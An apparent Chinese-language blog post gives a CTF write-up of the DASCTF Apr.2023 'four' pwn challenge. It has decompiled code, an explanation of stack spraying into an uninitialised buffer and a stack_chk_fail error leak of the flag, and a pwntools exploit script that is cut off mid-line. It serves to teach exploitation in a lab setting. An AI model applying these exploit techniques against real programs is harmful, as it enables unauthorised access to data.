@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="four这题的知识点有两个 一个是栈溅射 还有一个是利用stack_chk_fail函数输出报错信息来泄露flag  __int64 __fastcall main(__int64 a1, char **a2, char **a3)&amp;#123;  int v4; &#x2F;&#x2F; [rsp+0h] [rbp-10h] BYREF  int i; &#x2F;&#x2F; [rsp+4h] [rbp-Ch]  unsigned _">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF Apr.2023 X SU">
+<meta property="og:url" content="http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="four这题的知识点有两个 一个是栈溅射 还有一个是利用stack_chk_fail函数输出报错信息来泄露flag  __int64 __fastcall main(__int64 a1, char **a2, char **a3)&amp;#123;  int v4; &#x2F;&#x2F; [rsp+0h] [rbp-10h] BYREF  int i; &#x2F;&#x2F; [rsp+4h] [rbp-Ch]  unsigned _">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061249903.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061311952.png">
+<meta property="article:published_time" content="2023-05-06T04:48:07.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:18:56.149Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061249903.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>DASCTF Apr.2023 X SU</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/05/09/tcache-stashing-unlink-attack/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/05/02/%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9B/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&text=DASCTF Apr.2023 X SU"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&title=DASCTF Apr.2023 X SU"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&is_video=false&description=DASCTF Apr.2023 X SU"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DASCTF Apr.2023 X SU&body=Check out this article: http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&title=DASCTF Apr.2023 X SU"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&title=DASCTF Apr.2023 X SU"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&title=DASCTF Apr.2023 X SU"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&title=DASCTF Apr.2023 X SU"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&name=DASCTF Apr.2023 X SU&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/05/06/DASCTF-Apr-2023-X-SU/&t=DASCTF Apr.2023 X SU"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#four"><span class="toc-number">1.</span> <span class="toc-text">four</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        DASCTF Apr.2023 X SU
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-06T04:48:07.000Z" class="dt-published" itemprop="datePublished">2023-05-06</time>
+        
+        (Updated: <time datetime="2023-09-14T17:18:56.149Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/wp/">wp</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="four"><a href="#four" class="headerlink" title="four"></a>four</h1><p>这题的知识点有两个 一个是栈溅射 还有一个是利用stack_chk_fail函数输出报错信息来泄露flag</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061249903.png" title="image-20230506124946816" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061249903.png" alt="image-20230506124946816"></a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your choice : &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4014B9();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4013E1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">5</span> || v4 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">2</span> )</span><br><span class="line">      sub_400B94();</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">      sub_400CA8();</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">3</span> )</span><br><span class="line">      sub_40101C();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ida打开乍一看是堆题 不过跟进一下函数发现不是</p>
+<p>当v4&#x3D;1时进入的函数 虽然直接给了我们printf函数的真实地址 但是关闭了标准错误的输出 会给我们后面的利用造成困扰 并且这题实际上也不需要libc基址</p>
+<p>接下来的四个函数都有作用 我们分别跟进一下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400B94</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+Bh] [rbp-6015h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-6014h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">24584</span>]; <span class="comment">// [rsp+10h] [rbp-6010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+6018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You can give any value, trust me, there will be no overflow&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">24559</span> || v3 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO OVERFLOW!!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Actually, this function doesn&#x27;t seem to be useful&quot;</span>);</span><br><span class="line">  my_read(v4, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Really?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="string">&#x27;y&#x27;</span> || buf == <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = sub_4009A7(v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;content : %s&quot;</span>, v0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数可以供我们写入非常多的字节  因此会和其他函数执行时的栈帧空间重合 如果下一个函数没有对栈帧进行清空的话 就会造成数据残留 这一点很重要</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400CA8</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-260h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-25Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+8h] [rbp-258h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-254h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-250h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-24Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+18h] [rbp-248h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-244h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+50h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+150h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+258h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(s1, <span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter level:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter mode:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter X:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">4</span> || v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid data!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a string: &quot;</span>);</span><br><span class="line">  my_read(s, <span class="number">250</span>);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(i % v1) || !(i % v2) )</span><br><span class="line">      buf[v6++] = s[i];</span><br><span class="line">    <span class="keyword">if</span> ( !(i % v3) )</span><br><span class="line">      buf[i] = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input filename&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%14s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(s1, <span class="string">&quot;output.txt&quot;</span>, <span class="number">0xA</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(s1, <span class="string">&quot;output.txt&quot;</span>, <span class="number">0xC</span>uLL);</span><br><span class="line">    <span class="built_in">strncpy</span>(dest, s1, <span class="number">0xC</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  fd = open(dest, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;open error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to write data?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. yes\n2.no&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(fd, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Successly!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;OK!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这一个函数的前面部分依然是干扰代码 不用理就行了 关键在于后面的open</p>
+<p>可以看到 利用strncmp进行了一个判断 如果filename为output.txt的话  就不会进入if分支 从而dest这个变量就不会被赋值 </p>
+<p>直到做到这题 我才大概理解为什么变量一般都需要声明时赋值了 就是为了防止栈帧重合导致的数据残留</p>
+<p>如果我们利用上一个函数造成数据残留 此时dest变量如果没有被赋值 那么其就会继承这个数据</p>
+<p>也就是说如果我们读入大量的flag字符串 那么此时dest变量就会继承flag这个字符串 相当于open了flag文件</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_40101C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Bh] [rbp-135h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-134h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+10h] [rbp-130h]</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// [rsp+18h] [rbp-128h]</span></span><br><span class="line">  <span class="type">char</span> delim[<span class="number">2</span>]; <span class="comment">// [rsp+2Ah] [rbp-116h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+38h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">240</span>]; <span class="comment">// [rsp+40h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *s = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  fd = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(delim, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;info&gt;&gt;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%256s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = strtok(s, delim); i; i = strtok(<span class="number">0LL</span>, delim) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; i[j]; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i[j] == <span class="string">&#x27;~&#x27;</span> &amp;&amp; i[j + <span class="number">1</span>] &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; i[j + <span class="number">1</span>] &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">        fd = i[j + <span class="number">1</span>] - <span class="number">48</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i[j] == <span class="string">&#x27;:&#x27;</span> &amp;&amp; i[j + <span class="number">1</span>] &amp;&amp; i[j + <span class="number">2</span>] &amp;&amp; i[j + <span class="number">3</span>] &amp;&amp; !i[j + <span class="number">4</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(v6) = i[j + <span class="number">1</span>];</span><br><span class="line">        BYTE1(v6) = i[j + <span class="number">2</span>];</span><br><span class="line">        HIWORD(v6) = i[j + <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( i[j] == <span class="string">&#x27;@&#x27;</span> &amp;&amp; i[j + <span class="number">2</span>] == <span class="string">&#x27;*&#x27;</span> &amp;&amp; i[j + <span class="number">1</span>] &gt; <span class="string">&#x27;`&#x27;</span> &amp;&amp; i[j + <span class="number">1</span>] &lt;= <span class="number">122</span> )</span><br><span class="line">        v1 = i[j + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt;= <span class="number">2</span> || fd &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, ((SBYTE1(v6) &lt;&lt; <span class="number">8</span>) + (v6 &lt;&lt; <span class="number">16</span>) + SBYTE2(v6)), v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这一个函数的作用在于把flag文件的内容写到bss段上的地址 为什么要多此一举呢 在我TEB绕过canary的文章有提及stack_chk_fail函数输出报错信息的依据 原理这里就不复述了</p>
+<p>顺便真的很想吐槽一句 这里非要加一个代码审计来强行使得题目难度看起来增加 不是很理解这种操作的意义何在</p>
+<p>利用strtok函数返回一个指针 起始地址为我们输入的s字符串中 ‘&gt;’字符的地址</p>
+<p>随后就是三个if判断 分别决定了文件描述符 read写入的地址 写入的字节长</p>
+<p>唯一要注意的就是第二个if判断  由于调用的是scanf 所以如果我们想要读入地址的话 要注意不能为\x20 或者 \x00 这样的字节 会导致scanf截断 后面的字符丢失</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_4013E1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_60204C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is a strange overflow. Because of canary, you must not hijack the return address&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    ++dword_60204C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后一个函数 提供了一次栈溢出的机会 此时计算一下stack_chk_fail调用的指针偏移 就可以借助报错输出flag了</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061311952.png" title="image-20230506131154899" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061311952.png" alt="image-20230506131154899"></a></p>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;59.110.164.72&quot;,10001)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;You can give any value, trust me, there will be no overflow&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x5fef</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Actually, this function doesn&#x27;t seem to be useful&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;./flag\x00\x00&quot;</span>*<span class="number">0xbfd</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Really?&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter level:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter 